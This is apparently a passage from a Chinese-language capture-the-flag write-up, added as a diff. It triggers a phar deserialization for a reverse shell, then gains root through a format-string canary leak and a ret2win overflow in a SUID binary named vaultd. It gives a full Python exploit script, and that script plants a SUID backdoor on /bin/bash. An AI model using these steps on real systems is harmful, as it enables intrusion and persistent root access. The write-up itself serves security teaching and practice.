+curl -s -b cookie.txt --data-urlencode "id=$ID" "http://$IP/?c=Task&m=repair"
+```
+
+repair 内部 `rawurldecode(file_get_contents($src))` 把一次编码的内容解回原始二进制，写入 `archive/<id>.bin`。此时 `.bin` 就是一个合法的 phar 文件。
+
+开好监听：
+
+```bash
+nc -lvnp 8888
+```
+
+触发 phar 反序列化：
+
+```bash
+curl -s -b cookie.txt --data-urlencode "file=phar:///var/labdata/archive/$ID.bin/a.txt" "http://$IP/?c=Files&m=read"
+```
+
+页面返回 `not reasonable`，这是 filter 的输出，完全预期。关键是 `file_get_contents("phar://...")` 已经在 filter 之前执行了，metadata 反序列化触发了整条 gadget 链。
+
+监听端收到反弹 shell：
+
+```
+www-data@phar:/var/www/html$
+```
+
+# 提权
+
+跑了 linpeas，注意到一个异常 SUID：
+
+```
+-rwsr-xr-x 1 root root 16432 /opt/vaultd (Unknown SUID binary!)
+```
+
+一个自定义的 SUID 程序，未剥离符号。
+
+## vaultd 分析
+
+```bash
+file /opt/vaultd
+strings /opt/vaultd
+nm -n /opt/vaultd
+```
+
+strings 里直接看到了 `hidden_maintenance_shell`、`/bin/sh`、`[maintenance] win function reached!`。nm 给出所有函数地址：
+
+```
+0x4013cb hidden_maintenance_shell
+0x401314 support_ticket
+0x401468 restore_recipe
+0x404060 stage (BSS)
+```
+
+程序是菜单式交互，四个选项。用 Ghidra 看了伪代码：
+
+**hidden_maintenance_shell** — 不在菜单里，但编译进了程序。反汇编可以看到它用 syscall 直接调了 `setresuid(0,0,0)`、`setresgid(0,0,0)`、`execve("/bin/sh", argv, NULL)`。只要能跳过去就是 root shell。
+
+```bash
+objdump -d -M intel /opt/vaultd | sed -n '/<hidden_maintenance_shell>/,/^$/p'
+```
+
+```asm
+mov    rax,0x77     ; setresuid
+syscall
+mov    rax,0x75     ; setresgid
+syscall
+lea    rdi,[rip+...]  ; "/bin/sh"
+mov    rax,0x3b     ; execve
+syscall
+```
+
+**support_ticket（菜单2）** — 有个格式化字符串漏洞：
+
+```c
+char buf[136];
+read(0, buf, 0x7F);
+printf(buf);
+```
+
+用户输入被直接传给 printf，可以用 `%N$p` 泄露栈上的值，包括 canary。
+
+**restore_recipe（菜单3）** — 有栈溢出：
+
+```c
+char buf[72];    // rbp-0x50
+// canary at    rbp-0x08
+
+read(0, &stage, 0x400);  // 第一次输入写全局变量，无所谓
+read(0, buf, 0x180);     // 第二次输入，0x180 远大于 72，溢出
+```
+
+程序开了 Stack Canary，不能直接溢出，得先泄露 canary。
+
+```bash
+readelf -h /opt/vaultd | grep Type
+```
+
+```
+Type: EXEC (Executable file)
+```
+
+非 PIE，`hidden_maintenance_shell` 地址固定，可以直接 ret2win。
+
+## 攻击思路
+
+同一个进程内：菜单 2 用格式化字符串泄露 canary → 回到菜单 → 菜单 3 栈溢出覆盖返回地址为 `hidden_maintenance_shell`。
+
+canary 必须在同一个进程里泄露并使用，每次 fork 新进程 canary 都不一样。
+
+栈布局：buf 从 `rbp-0x50` 开始，canary 在 `rbp-0x08`，到 canary 的偏移是 72 字节。覆盖 canary 后还要 8 字节的 saved rbp，然后是返回地址。
+
+payload 结构：
+
+```
+'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)
+```
+
+这里有一个细节：x86-64 System V ABI 要求在 `call` 指令执行时 RSP 必须 16 字节对齐。溢出后直接跳 `hidden_maintenance_shell`，RSP 可能只是 8 字节对齐，导致里面 `puts` 调用时的 `movaps` 指令触发 SIGSEGV。解决办法是在返回地址前垫一个只含 `ret` 指令的 gadget，多弹一次栈凑齐对齐：
+
+```bash
+objdump -d -M intel /opt/vaultd | grep -m1 'ret$'
+```
+
+```
+40101a: c3    ret
+```
+
+所以实际 payload 有两种形态，脚本里两种都会尝试：
+
+```
+'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)                          # 直接跳 win
+'A'*72 + p64(canary) + 'B'*8 + p64(0x40101a) + p64(0x4013cb)          # ret 对齐后跳 win
+```
+
+## exploit
+
+这里踩了个坑。直接在 bash 里用 `printf '2\n%1$p...\n'` 会被 bash 的 printf 自己解释掉 `$`，输出一片空白。全部换成 Python 来做交互。
+
+写了个自动化脚本，遍历格式化字符串偏移 1-100，在同一个进程里泄露值后尝试溢出。如果 canary 对了，程序正常走到 `hidden_maintenance_shell`；如果 canary 错了，程序会触发 `__stack_chk_fail` 崩掉。脚本自动判断结果。
+
+把下面内容保存为 `/tmp/pwn.py`：
+
+```python
+import subprocess,struct,os,sys,select,time,re
+
+BIN = '/opt/vaultd'
+WIN = 0x4013cb
+RET = 0x40101a
+
+def p64(x):
+    return struct.pack('<Q', x)
+
+def rd(proc, until=b'> ', timeout=3):
+    buf = b''
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        try:
+            rr, _, _ = select.select([proc.stdout], [], [], 0.1)
+        except:
+            break
+        if rr:
+            try:
+                chunk = os.read(proc.stdout.fileno(), 4096)
+            except:
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if until and until in buf:
+                break
+    return buf
+
+def wr(proc, data):
+    try:
+        proc.stdin.write(data)
+        proc.stdin.flush()
+    except:
+        pass
+
+def try_exploit(canary_idx, use_ret_gadget):
+    proc = subprocess.Popen(
+        [BIN],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT
+    )
+    rd(proc, b'> ')
+    wr(proc, b'2\n')
+    rd(proc, b'ticket:\n')
+    wr(proc, ('%%%d$p\n' % canary_idx).encode())
+    resp = rd(proc, b'> ')
+    matches = re.findall(rb'0x[0-9a-fA-F]+', resp)
+    if not matches:
+        proc.kill()
+        return None
+    canary = int(matches[0], 16)
+    wr(proc, b'3\n')
+    rd(proc, b'memory:\n')
+    wr(proc, b'STAGE\n')
+    rd(proc, b'title:\n')
+    chain = (p64(RET) + p64(WIN)) if use_ret_gadget else p64(WIN)
+    payload = b'A' * 72 + p64(canary) + b'B' * 8 + chain + b'\n'
+    wr(proc, payload)
+    out = rd(proc, b'maintenance', 2)
+    if b'stack smashing' in out:
+        proc.kill()
+        return None
+    if b'maintenance' in out or b'$' in out or b'#' in out:
+        wr(proc, b'id\n')
+        time.sleep(0.3)
+        wr(proc, b'cat /root/root.txt\n')
+        time.sleep(0.3)
+        wr(proc, b'chmod u+s /bin/bash\n')
+        time.sleep(0.3)
+        wr(proc, b'exit\n')
+        time.sleep(0.3)
+        final = rd(proc, None, 3)
+        try:
+            proc.wait(timeout=2)
+        except:
+            proc.kill()
+        return (canary, canary_idx, use_ret_gadget, out + final)
+    remaining = rd(proc, None, 2)
+    combined = out + remaining
+    proc.kill()
+    if b'uid=0' in combined or b'flag{' in combined:
+        return (canary, canary_idx, use_ret_gadget, combined)
+    return None
+
+for idx in range(1, 100):
+    for use_ret in [False, True]:
+        result = try_exploit(idx, use_ret)
+        if result:
+            canary, ci, ur, output = result
+            print("[+] idx=%d canary=%s ret=%s" % (ci, hex(canary), ur))
+            print(output.decode(errors='ignore'))
+            sys.exit(0)
+```
+
+在 www-data 的 shell 里执行：
+
+```bash
+python3 /tmp/pwn.py
+```
+
+脚本自动找到了正确的 canary 偏移，成功覆盖返回地址跳到 `hidden_maintenance_shell`。输出里看到了 `[maintenance] win function reached!` 和 `uid=0(root)`。
+
+脚本还顺手执行了 `chmod u+s /bin/bash`，后面直接用 `/bin/bash -p` 拿持久 root shell：
+
+```bash
+/bin/bash -p
+id
+```
+
+```
+uid=33(www-data) gid=33(www-data) euid=0(root)
+```
+
+# Flag
+
+```bash
+cat /home/welcome/user.txt
+cat /root/root.txt
+```
+
+```
+flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
+flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
+```
